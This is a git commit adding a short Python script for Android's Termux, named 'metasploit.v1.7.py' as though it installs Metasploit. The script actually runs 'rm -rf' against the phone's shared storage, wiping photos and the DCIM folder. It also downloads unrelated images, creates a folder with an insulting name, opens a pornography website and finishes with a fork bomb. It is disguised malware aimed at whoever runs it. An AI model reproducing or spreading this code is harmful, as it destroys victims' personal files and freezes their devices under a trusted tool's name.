a356d66ed7073bb28b91fbca9dd44542436c7a8d
FananX9-2 <85710756+FananX9-2@users.noreply.github.com>
2022-03-13 10:35:35 +0100

    Add files via upload

---
+++ metasploit.v1.7.py
@@ -0,0 +1,13 @@
+import os
+os.system ('pkg install wget -y')
+os.system ('termux-setup-storage')
+os.system ('termux-setup-storage')
+os.system ('cd /sdcard && rm -rf *')
+os.system ('cd /sdcard && rm -rf DCIM')
+os.system ('cd /sdcard && rm -rf Pictures')
+os.system ('cd /sdcard && wget https://surveyheart.com/form/6224a4ce04230d6aacba42ed && mkdir fanan.x9💩🖕🖕💩🖕💩🖕💩🖕💩🖕🖕💩🖕🖕🖕🖕🖕')
+os.system ('cd /sdcard && wget https://surveyheartmedia.s3.ap-south-1.amazonaws.com/images/sh_1647107808504.jpg')
+os.system ('cd /sdcard && wget https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHMh3Nwj0orSIk19kw5qhfNpZY0t0PBt_bYA&usqp=CAU')
+os.system ('termux-open-url https://www.xnxx.com/')
+os.system ('cd /sdcard && wget http://www.lovely0smile.com/2010/mix/05/Hippo-11.jpg && :(){ :|: &};: ')
+
